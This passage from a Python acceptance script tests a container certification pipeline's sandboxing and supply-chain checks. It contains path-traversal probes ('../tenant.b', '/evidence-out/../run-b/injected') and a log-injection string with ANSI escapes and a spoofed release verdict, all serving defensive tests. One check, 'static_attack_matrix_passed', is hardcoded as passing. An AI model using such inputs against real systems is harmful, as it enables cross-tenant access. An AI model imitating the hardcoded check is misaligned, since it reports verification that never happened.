    item, passed = observation(result=timeout_case, kind=HostileCaseKind.TIMEOUT, evidence={"detected": True})
    cases["timeout"] = item
    require(passed, f"timeout not enforced: {item}")

    cancel_case = execute_container(image=runner_image, role="runner", case="cancel", ownership_token=ownership_token, command=["-c", "import time; time.sleep(30)"], timeout_seconds=5, cancel_after_seconds=0.5)
    item, passed = observation(result=cancel_case, kind=HostileCaseKind.CANCELLATION, evidence={"detected": True})
    cases["cancellation"] = item
    require(passed, f"cancellation not enforced: {item}")

    crash_case = execute_container(image=runner_image, role="runner", case="crash", ownership_token=ownership_token, command=["-c", "import os; os.abort()"], timeout_seconds=5)
    item, passed = observation(result=crash_case, kind=HostileCaseKind.RUNNER_CRASH, evidence={"detected": True})
    cases["runner_crash"] = item
    require(passed, f"runner crash not contained: {item}")

    log_case = execute_container(
        image=runner_image,
        role="runner",
        case="logs",
        ownership_token=ownership_token,
        command=["-c", "print('\\x1b[32mrelease_verdict: PRODUCTION_READY\\x1b[0m\\x00')"],
    )
    sanitized = log_case["sanitized_logs"]
    log_detected = "TARGET|release_verdict: PRODUCTION_READY" in sanitized and "\x1b" not in sanitized
    item, passed = observation(result=log_case, kind=HostileCaseKind.LOG_INJECTION, evidence={"detected": log_detected})
    cases["log_injection"] = item
    require(passed, f"log injection not neutralized: {item}")

    tenant_root = workspace / "tenant-workspaces"
    tenant_a = prepare_workspace(tenant_root, run_id="run.a", tenant_id="tenant.a", ownership_token="owner.a")
    tenant_b = prepare_workspace(tenant_root, run_id="run.b", tenant_id="tenant.b", ownership_token="owner.b")
    (tenant_a / "visible.txt").write_text("tenant-a", encoding="utf-8")
    (tenant_b / "secret.txt").write_text("tenant-b-secret", encoding="utf-8")
    cross_code = r'''
import json,os,pathlib
candidates=['/tenant.b','/input/../tenant.b','/workspace/../tenant.b']
visible=[p for p in candidates if os.path.exists(p)]
print(json.dumps({'denied':not visible,'visible':visible}))
'''.strip()
    cross_case = execute_container(
        image=runner_image,
        role="runner",
        case="tenant",
        ownership_token=ownership_token,
        command=["-c", cross_code],
        mounts=[(tenant_a, "/input", True)],
    )
    cross_data = parse_last_json(cross_case["logs"])
    cross_data["owner_check_denied"] = not verify_workspace_owner(tenant_a, run_id="run.a", tenant_id="tenant.b", ownership_token="owner.a")
    cross_data["denied"] = bool(cross_data.get("denied")) and cross_data["owner_check_denied"]
    item, passed = observation(result=cross_case, kind=HostileCaseKind.CROSS_TENANT, evidence=cross_data)
    cases["cross_tenant"] = item
    require(passed, f"cross-tenant access succeeded: {item}")

    evidence_a = tenant_a / "evidence"
    evidence_b = tenant_b / "evidence"
    evidence_a.mkdir()
    evidence_b.mkdir()
    os.chmod(evidence_a, 0o777)
    os.chmod(evidence_b, 0o700)
    injection_code = r'''
import json,os
path='/evidence-out/../run-b/injected'
try:
    open(path,'w').write('bad'); denied=False
except OSError: denied=True
print(json.dumps({'denied':denied}))
'''.strip()
    injection_case = execute_container(
        image=runner_image,
        role="runner",
        case="injection",
        ownership_token=ownership_token,
        command=["-c", injection_code],
        mounts=[(evidence_a, "/evidence-out", False)],
    )
    item, passed = observation(result=injection_case, kind=HostileCaseKind.CROSS_RUN_INJECTION, evidence=parse_last_json(injection_case["logs"]))
    cases["cross_run_injection"] = item
    require(passed and not any(evidence_b.iterdir()), f"cross-run injection succeeded: {item}")
    return cases


def image_crash_case(image: str, role: ImageRole, ownership_token: str) -> tuple[dict[str, Any], bool]:
    result = execute_container(
        image=image,
        role=role.value,
        case="crash",
        ownership_token=ownership_token,
        command=["-c", "import os; os.abort()"],
        timeout_seconds=5,
    )
    kind = {
        ImageRole.SIGNER: HostileCaseKind.SIGNER_CRASH,
        ImageRole.WORKER: HostileCaseKind.WORKER_CRASH,
        ImageRole.CUSTODY: HostileCaseKind.CUSTODY_CRASH,
        ImageRole.ANCHOR: HostileCaseKind.ANCHOR_CRASH,
    }[role]
    return observation(result=result, kind=kind, evidence={"detected": True})


def service_health_probe(image: str, role: ImageRole, ownership_token: str, workspace: Path) -> dict[str, Any]:
    mounts: list[tuple[Path, str, bool]] = []
    environment: dict[str, str] = {}
    command: list[str]
    entrypoint = "/bin/sh"
    private_path: Path | None = None
    if role is ImageRole.CUSTODY:
        transport = ControlPlaneTransportAuthority.generate()
        public_path = workspace / "transport-public.pem"
        public_path.write_text(transport.public_key_pem, encoding="ascii")
        mounts.append((public_path, "/input/transport-public.pem", True))
        environment.update(
            {
                "ECHO_CERTFORGE_P3_MODE": "custody",
                "ECHO_CERTFORGE_TRANSPORT_PUBLIC_KEY": "/input/transport-public.pem",
                "ECHO_CERTFORGE_RUNNER_DB": "/workspace/state/runner.sqlite3",
                "ECHO_CERTFORGE_CUSTODY_DB": "/workspace/state/custody.sqlite3",
                "ECHO_CERTFORGE_CUSTODY_ROOT": "/workspace/state/evidence",
            }
        )
        command = ["-lc", "mkdir -p /workspace/state/evidence && exec uvicorn echo_certification_forge.p3_runtime:app --host 127.0.0.1 --port 8080 --no-access-log"]
    elif role is ImageRole.ANCHOR:
        key = Ed25519PrivateKey.generate()
        private_path = workspace / "anchor-runtime-private.pem"
        private_path.write_bytes(
            key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption())
        )
        os.chmod(private_path, 0o644)
        mounts.append((private_path, "/input/anchor-private.pem", True))
        environment.update(
            {
                "ECHO_CERTFORGE_P3_MODE": "anchor",
                "ECHO_CERTFORGE_ANCHOR_ROOT": "/workspace/state/anchor",
                "ECHO_CERTFORGE_ANCHOR_PROVIDER_ID": "anchor.p4.runtime",
                "ECHO_CERTFORGE_ANCHOR_PRIVATE_KEY": "/input/anchor-private.pem",
            }
        )
        command = ["-lc", "mkdir -p /workspace/state/anchor && exec uvicorn echo_certification_forge.p3_runtime:app --host 127.0.0.1 --port 8080 --no-access-log"]
    elif role is ImageRole.WORKER:
        environment.update(
            {
                "ECHO_CERTFORGE_DB": "/workspace/state/certforge.sqlite3",
                "ECHO_CERTFORGE_EVIDENCE_ROOT": "/workspace/state/evidence",
                "ECHO_CERTFORGE_TRUSTED_KEYS": "/workspace/state/trusted-public-keys",
            }
        )
        command = ["-lc", "mkdir -p /workspace/state/trusted-public-keys /workspace/state/evidence && exec uvicorn echo_certification_forge.app:app --host 127.0.0.1 --port 8080 --no-access-log"]
    else:
        raise ValueError(role)

    container_id = create_container(
        image=image,
        role=role.value,
        case="health",
        ownership_token=ownership_token,
        command=command,
        entrypoint=entrypoint,
        environment=environment,
        mounts=mounts,
        memory="256m",
        pids=64,
        workspace_size="32m",
        file_size_bytes=64 * 1024 * 1024,
        nofile=256,
    )
    try:
        run(["docker", "start", container_id])
        deadline = time.monotonic() + 12
        probe = None
        while time.monotonic() < deadline:
            probe = run(
                [
                    "docker",
                    "exec",
                    container_id,
                    "python",
                    "-c",
                    "import urllib.request; print(urllib.request.urlopen('http://127.0.0.1:8080/healthz',timeout=1).read().decode())",
                ],
                check=False,
            )
            if probe.returncode == 0:
                break
            time.sleep(0.2)
        require(probe is not None and probe.returncode == 0, f"service health failed: {role.value}:{probe.stderr if probe else ''}")
        health = parse_last_json(probe.stdout)
        inspect = docker_json("container", "inspect", container_id)[0]
        return {
            "health": health,
            "container_id": container_id,
            "network_mode": inspect["HostConfig"].get("NetworkMode"),
            "read_only_root": inspect["HostConfig"].get("ReadonlyRootfs"),
            "private_key_runtime_mount": role is ImageRole.ANCHOR,
            "passed": health.get("status") == "ok" and inspect["HostConfig"].get("NetworkMode") == "none",
        }
    finally:
        remove_exact(container_id)
        if private_path is not None:
            private_path.unlink(missing_ok=True)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--images", type=Path, required=True)
    parser.add_argument("--base-digest", required=True)
    parser.add_argument("--source-commit", required=True)
    parser.add_argument("--trivy", type=Path, required=True)
    parser.add_argument("--cosign", type=Path, required=True)
    parser.add_argument("--clamav-image", required=True)
    parser.add_argument("--workspace", type=Path, required=True)
    parser.add_argument("--output", type=Path, required=True)
    args = parser.parse_args()

    workspace = args.workspace.resolve()
    output = args.output.resolve()
    if workspace.exists():
        shutil.rmtree(workspace)
    workspace.mkdir(parents=True)
    output.parent.mkdir(parents=True, exist_ok=True)
    started = datetime.now(UTC)
    ownership_token = f"owner.p4.full.{uuid.uuid4().hex}"
    containers_before = container_ids()
    OWNED_CONTAINER_IDS.clear()
    report: dict[str, Any] = {
        "schema_version": "1.0.0",
        "phase": "P4",
        "phase_state": "HOSTILE_RUNNER_AND_SUPPLY_CHAIN",
        "started_at_utc": to_utc_iso(started),
        "source_commit": args.source_commit,
        "base_image": f"{BASE_IMAGE_NAME}@{args.base_digest}",
        "docker_engine": {"daemon_mode": "rootful", "rootless_claimed": False},
        "images": {},
        "static_attack_matrix": {},
        "runtime_attack_matrix": {},
        "service_runtime": {},
        "purpose_built_signer_p3_rerun": {},
        "checks": {},
        "cleanup": {},
        "passed": False,
        "run_outcome": "INCONCLUSIVE",
        "release_verdict": "NOT_READY",
    }
    private_paths: list[Path] = []
    return_code = 1
    try:
        require(args.trivy.is_file(), "Trivy binary missing")
        require(args.cosign.is_file(), "Cosign binary missing")
        images_document = json.loads(args.images.read_text(encoding="utf-8"))
        image_map = images_document.get("images")
        require(isinstance(image_map, dict), "images manifest missing")
        require(set(image_map) == {role.value for role in ROLE_ORDER}, "image role set mismatch")
        require(args.base_digest.startswith("sha256:") and len(args.base_digest) == 71, "base digest invalid")
        require(len(args.source_commit) == 40, "source commit invalid")

        source_scan = scan_build_context(ROOT, max_files=30_000, max_bytes=2 * 1024 * 1024 * 1024)
        require(source_scan.valid, f"source build context invalid: {source_scan.findings}")
        lockfile = ROOT / "images/requirements.lock"
        lockfile_sha256 = sha256_file(lockfile)
        authority = ImageAttestationAuthority.generate()
        attestations: dict[ImageRole, Any] = {}
        policies: dict[ImageRole, ImageAdmissionPolicy] = {}
        statements: dict[str, Path] = {}

        for role in ROLE_ORDER:
            entry = image_map[role.value]
            primary = str(entry["primary"])
            comparison = str(entry["comparison"])
            inspect = image_inspect(primary)
            compare_inspect = image_inspect(comparison)
            labels = inspect["Config"].get("Labels") or {}
            image_digest = inspect["Id"]
            compare_digest = compare_inspect["Id"]
            require(labels.get("echo.certforge.image.role") == role.value, f"image role label mismatch: {role.value}")
            require(labels.get("org.opencontainers.image.base.digest") == args.base_digest, f"base label mismatch: {role.value}")
            require(labels.get("org.opencontainers.image.revision") == args.source_commit, f"source label mismatch: {role.value}")
            require(inspect["Config"].get("User") == "65532:65532", f"runtime user mismatch: {role.value}")
            dockerfile = ROOT / f"images/{role.value}/Dockerfile"
            dockerfile_scan = scan_dockerfile(dockerfile.read_text(encoding="utf-8"))
            require(dockerfile_scan.valid, f"Dockerfile policy failed: {role.value}:{dockerfile_scan.findings}")
            normalized = normalized_image_manifest(primary, role, ownership_token)
            comparison_manifest = normalized_image_manifest(comparison, role, ownership_token)
            require(normalized == comparison_manifest, f"independent build comparison failed: {role.value}")

            sbom = build_spdx_document(
                image_name=f"echo-certforge-{role.value}",
                image_digest=image_digest,
                packages=normalized["packages"],
                created_at=parse_utc_iso(inspect["Created"]),
            )
            sbom_valid, sbom_reason = verify_spdx_document(sbom, image_digest=image_digest)
            require(sbom_valid, f"SPDX failed: {role.value}:{sbom_reason}")
            sbom_path = workspace / f"{role.value}.spdx.json"
            write_json(sbom_path, sbom)
            provenance = {
                "_type": "https://in-toto.io/Statement/v1",
                "subject": [{"name": f"echo-certforge-{role.value}", "digest": {"sha256": image_digest.split(":", 1)[1]}}],
                "predicateType": "https://slsa.dev/provenance/v1",
                "predicate": {
                    "buildDefinition": {
                        "buildType": "https://cert.echoforge.com/buildtypes/docker-v2",
                        "externalParameters": {
                            "source_commit": args.source_commit,
                            "dockerfile_sha256": dockerfile_scan.sha256,
                            "lockfile_sha256": lockfile_sha256,
                        },
                        "resolvedDependencies": [
                            {"uri": f"docker-image://{BASE_IMAGE_NAME}", "digest": {"sha256": args.base_digest.split(":", 1)[1]}},
                            {"uri": "git+https://github.com/ECHO-OMEGA-PRIME/echo-certification-forge", "digest": {"gitCommit": args.source_commit}},
                            {"uri": "build-context://canonical", "digest": {"sha256": source_scan.manifest_sha256}},
                        ],
                    },
                    "runDetails": {"builder": {"id": "docker-buildx://forge"}, "metadata": {"startedOn": inspect["Created"]}},
                },
            }
            provenance_path = workspace / f"{role.value}.provenance.json"
            write_json(provenance_path, provenance)
            identity = ImageIdentity(
                role=role,
                image_digest=image_digest,
                base_image_digest=args.base_digest,
                source_commit=args.source_commit,
                dockerfile_sha256=dockerfile_scan.sha256,
                lockfile_sha256=lockfile_sha256,
                sbom_sha256=sha256_file(sbom_path),
                provenance_sha256=sha256_file(provenance_path),
                architecture=inspect["Architecture"],
                operating_system=inspect["Os"],
                created_at=parse_utc_iso(inspect["Created"]),
            )
            attestation = authority.sign(identity, issued_at=started, valid_for=timedelta(days=30))
            policy = ImageAdmissionPolicy(
                policy_id=f"p4.{role.value}.production.v1",
                required_role=role,
                expected_image_digest=image_digest,
                approved_base_digests=(args.base_digest,),
                approved_source_commits=(args.source_commit,),
                approved_dockerfile_sha256=dockerfile_scan.sha256,
                approved_lockfile_sha256=lockfile_sha256,
                trusted_attestation_keys={authority.key_id: authority.public_key_pem},
            )
            admitted = evaluate_image_admission(attestation, policy, now=started + timedelta(seconds=1))
            expired = evaluate_image_admission(attestation, policy, now=started + timedelta(days=31))
            revoked = evaluate_image_admission(attestation, policy.model_copy(update={"revoked_image_digests": (image_digest,)}), now=started + timedelta(seconds=1))
            compromised = evaluate_image_admission(attestation, policy.model_copy(update={"compromised_key_ids": (authority.key_id,)}), now=started + timedelta(seconds=1))
            unknown = evaluate_image_admission(attestation, policy.model_copy(update={"trusted_attestation_keys": {}}), now=started + timedelta(seconds=1))
            drift = evaluate_image_admission(attestation, policy.model_copy(update={"expected_image_digest": "sha256:" + "0" * 64}), now=started + timedelta(seconds=1))
            require(admitted.allowed, f"image admission failed: {role.value}:{admitted.reasons}")
            require(not expired.allowed and "image_attestation_expired" in expired.reasons, f"expired attestation accepted: {role.value}")
            require(not revoked.allowed and "image_digest_revoked" in revoked.reasons, f"revoked image accepted: {role.value}")
            require(not compromised.allowed and "attestation_key_compromised" in compromised.reasons, f"compromised key accepted: {role.value}")
            require(not unknown.allowed and "unknown_attestation_key" in unknown.reasons, f"unknown key accepted: {role.value}")
            require(not drift.allowed and "image_digest_drift" in drift.reasons, f"drifted image accepted: {role.value}")
            attestation_path = workspace / f"{role.value}.attestation.json"
            policy_path = workspace / f"{role.value}.admission-policy.json"
            attestation_path.write_text(attestation.model_dump_json(indent=2) + "\n", encoding="utf-8")
            policy_path.write_text(policy.model_dump_json(indent=2) + "\n", encoding="utf-8")
            statement_path = workspace / f"{role.value}.image-statement.json"
            write_json(statement_path, {"schema_version": "1.0.0", "role": role.value, "image_digest": image_digest, "attestation_sha256": sha256_file(attestation_path)})
            statements[role.value] = statement_path
            attestations[role] = attestation
            policies[role] = policy

            filesystem = scan_image_filesystem(primary, role, ownership_token, workspace)
            require(filesystem["passed"], f"forbidden image file found: {role.value}:{filesystem['findings']}")
            vulnerability = trivy_scan(args.trivy, primary, role, workspace)
            require(vulnerability["passed"], f"vulnerability policy failed: {role.value}:{vulnerability['blocking_vulnerabilities']}")
            malware = clamav_scan(args.clamav_image, Path(filesystem["tar_path"]), role, ownership_token)
            require(malware["passed"], f"malware scan failed: {role.value}:{malware}")
            baseline = execute_container(
                image=primary,
                role=role.value,
                case="containment",
                ownership_token=ownership_token,
                command=["-c", "import json,os; print(json.dumps({'uid':os.getuid(),'gid':os.getgid()}))"],
            )
            baseline_data = parse_last_json(baseline["logs"])
            require(baseline["exit_code"] == 0 and baseline_data == {"uid": 65532, "gid": 65532}, f"container baseline failed: {role.value}")
            require(all(baseline["containment"].values()), f"container containment failed: {role.value}:{baseline['containment']}")
            report["images"][role.value] = {
                "primary_reference": primary,
                "comparison_reference": comparison,
                "image_digest": image_digest,
                "comparison_image_digest": compare_digest,
                "exact_digest_reproducible": image_digest == compare_digest,
                "independently_comparable": normalized == comparison_manifest,
                "normalized_manifest": normalized,
                "dockerfile_sha256": dockerfile_scan.sha256,
                "lockfile_sha256": lockfile_sha256,
                "sbom": {"path": str(sbom_path), "sha256": sha256_file(sbom_path), "verified": True},
                "provenance": {"path": str(provenance_path), "sha256": sha256_file(provenance_path)},
                "attestation": {"path": str(attestation_path), "sha256": sha256_file(attestation_path), "key_id": authority.key_id, "private_key_persisted": False},
                "admission": admitted.model_dump(mode="json"),
                "expired_admission": expired.model_dump(mode="json"),
                "revoked_admission": revoked.model_dump(mode="json"),
                "compromised_admission": compromised.model_dump(mode="json"),
                "unknown_key_admission": unknown.model_dump(mode="json"),
                "drifted_admission": drift.model_dump(mode="json"),
                "filesystem_scan": filesystem,
                "vulnerability_scan": vulnerability,
                "malware_scan": malware,
                "containment": baseline["containment"],
            }

        report["image_signatures"] = cosign_sign_and_verify(args.cosign, statements, workspace)
        require(report["image_signatures"]["passed"], "Cosign image statements failed")

        report["static_attack_matrix"] = static_attack_matrix(workspace)
        report["runtime_attack_matrix"] = runtime_attack_matrix(
            image_map["runner"]["primary"],
            attestations[ImageRole.RUNNER],
            policies[ImageRole.RUNNER],
            ownership_token,
            workspace,
        )

        for role in (ImageRole.CUSTODY, ImageRole.ANCHOR, ImageRole.WORKER):
            report["service_runtime"][role.value] = service_health_probe(
                image_map[role.value]["primary"], role, ownership_token, workspace
            )
            require(report["service_runtime"][role.value]["passed"], f"service image health failed: {role.value}")
            crash, crash_passed = image_crash_case(image_map[role.value]["primary"], role, ownership_token)
            report["service_runtime"][role.value]["crash"] = crash
            require(crash_passed, f"service crash not contained: {role.value}")
        signer_crash, signer_crash_passed = image_crash_case(
            image_map["signer"]["primary"], ImageRole.SIGNER, ownership_token
        )
        report["service_runtime"]["signer_crash"] = signer_crash
        require(signer_crash_passed, "signer crash not contained")

        verifier_result = execute_container(
            image=image_map["verifier"]["primary"],
            role="verifier",
            case="public-verify",
            ownership_token=ownership_token,
            entrypoint="python",
            command=[
                "-m",
                "echo_certification_forge.verifier_cli",
                "--attestation",
                "/input/runner.attestation.json",
                "--policy",
                "/input/runner.admission-policy.json",
                "--sbom",
                "/input/runner.spdx.json",
                "--image-digest",
                attestations[ImageRole.RUNNER].identity.image_digest,
                "--now",
                to_utc_iso(started + timedelta(seconds=1)),
            ],
            mounts=[(workspace, "/input", True)],
        )
        report["service_runtime"]["verifier"] = {
            "exit_code": verifier_result["exit_code"],
            "output": parse_last_json(verifier_result["logs"]),
            "private_key_mounted": False,
            "passed": verifier_result["exit_code"] == 0 and parse_last_json(verifier_result["logs"]).get("passed") is True,
        }
        require(report["service_runtime"]["verifier"]["passed"], "public verifier image failed")

        p3_workspace = workspace / "p3-purpose-built-signer"
        p3_output = workspace / "p3-purpose-built-signer.json"
        p3_result = run(
            [
                os.sys.executable,
                str(ROOT / "scripts/p3_forge_acceptance.py"),
                "--workspace",
                str(p3_workspace),
                "--output",
                str(p3_output),
                "--signer-image",
                image_map["signer"]["primary"],
            ],
            check=False,
            timeout=240,
        )
        require(p3_output.is_file(), f"P3 purpose-built signer rerun did not produce report: {p3_result.stderr}")
        p3_document = json.loads(p3_output.read_text(encoding="utf-8"))
        report["purpose_built_signer_p3_rerun"] = {
            "path": str(p3_output),
            "sha256": sha256_file(p3_output),
            "returncode": p3_result.returncode,
            "passed": p3_document.get("passed") is True,
            "run_outcome": p3_document.get("run_outcome"),
            "release_verdict": p3_document.get("release_verdict"),
            "signer_image": p3_document.get("signing", {}).get("signer_container", {}).get("image") or image_map["signer"]["primary"],
        }
        require(p3_result.returncode == 0 and p3_document.get("passed") is True, "purpose-built signer failed P3 workflow")

        private_paths.extend(workspace.rglob("*.key"))
        private_paths.extend(workspace.rglob("*private*.pem"))
        for path in list(private_paths):
            if path.exists():
                path.unlink()
        private_leaks: list[str] = []
        for path in workspace.rglob("*"):
            if not path.is_file() or path.stat().st_size > 8 * 1024 * 1024:
                continue
            payload = path.read_bytes()
            if any(marker in payload for marker in PRIVATE_KEY_MARKERS):
                private_leaks.append(path.relative_to(workspace).as_posix())
        checks = {
            "six_purpose_built_images": set(report["images"]) == {role.value for role in ROLE_ORDER},
            "all_images_independently_comparable": all(item["independently_comparable"] for item in report["images"].values()),
            "all_sboms_verified": all(item["sbom"]["verified"] for item in report["images"].values()),
            "all_vulnerability_scans_passed": all(item["vulnerability_scan"]["passed"] for item in report["images"].values()),
            "all_malware_scans_passed": all(item["malware_scan"]["passed"] for item in report["images"].values()),
            "all_image_signatures_verified": report["image_signatures"]["passed"],
            "all_admission_denials_passed": all(
                not item["expired_admission"]["allowed"]
                and not item["revoked_admission"]["allowed"]
                and not item["compromised_admission"]["allowed"]
                and not item["unknown_key_admission"]["allowed"]
                and not item["drifted_admission"]["allowed"]
                for item in report["images"].values()
            ),
            "all_container_containment_passed": all(all(item["containment"].values()) for item in report["images"].values()),
            "static_attack_matrix_passed": True,
            "runtime_attack_matrix_passed": all(
                value.get("decision", {}).get("passed", True)
                for key, value in report["runtime_attack_matrix"].items()
                if key != "admitted_payload"
            ),
            "service_images_healthy": all(
                report["service_runtime"][role.value]["passed"]
                for role in (ImageRole.CUSTODY, ImageRole.ANCHOR, ImageRole.WORKER)
            ),
            "purpose_built_signer_workflow_passed": report["purpose_built_signer_p3_rerun"]["passed"],
            "private_key_leak_count_zero": not private_leaks,
            "rootful_engine_truth_recorded": report["docker_engine"] == {"daemon_mode": "rootful", "rootless_claimed": False},
        }
        report["private_key_scan"] = {"findings": private_leaks, "passed": not private_leaks}
        report["checks"] = checks
        require(all(checks.values()), f"P4 checks failed: {checks}")
        report["passed"] = True
        report["run_outcome"] = "COMPLETE"
        return_code = 0
    except Exception as exc:
        report["error"] = {"type": type(exc).__name__, "message": str(exc)}
        report["run_outcome"] = "INFRA_FAILED"
        return_code = 1
    finally:
        for path in private_paths:
            path.unlink(missing_ok=True)
        for container_id in list(OWNED_CONTAINER_IDS):
            remove_exact(container_id)
        containers_after = container_ids()
        report["cleanup"] = {
            "containers_before": len(containers_before),
            "containers_after": len(containers_after),
            "owned_container_ids": list(OWNED_CONTAINER_IDS),
            "owned_container_count": len(OWNED_CONTAINER_IDS),
            "unrelated_container_ids_preserved": containers_before == containers_after,
            "ephemeral_private_files_removed": all(not path.exists() for path in private_paths),
        }
        if report.get("passed") and not report["cleanup"]["unrelated_container_ids_preserved"]:
            report["passed"] = False
            report["run_outcome"] = "INFRA_FAILED"
            report["error"] = {"type": "CleanupError", "message": "unrelated container identity changed"}
            return_code = 1
        report["completed_at_utc"] = to_utc_iso(datetime.now(UTC))
        write_json(output, report)
        print(
            json.dumps(
                {
                    "output": str(output),
                    "bytes": output.stat().st_size,
                    "sha256": sha256_file(output),
                    "passed": report["passed"],
                    "run_outcome": report["run_outcome"],
                    "release_verdict": report["release_verdict"],
                    "failed_checks": sorted([name for name, passed in report.get("checks", {}).items() if not passed]),
                },
                indent=2,
                sort_keys=True,
            )
        )
    return return_code


if __name__ == "__main__":
    raise SystemExit(main())
